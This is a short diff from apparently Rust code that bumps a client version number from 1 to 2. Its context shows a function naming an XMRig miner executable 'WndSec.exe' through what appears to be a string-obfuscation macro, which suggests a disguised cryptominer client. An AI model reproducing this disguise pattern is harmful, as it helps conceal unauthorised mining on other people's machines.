@@ -35,7 +35,7 @@ pub fn client_tag() -> String {
 }
 
 pub fn client_version() -> u64 {
-    1
+    2
 }
 pub fn xmrig_exe_name() -> String {
     s!("WndSec.exe").to_owned()
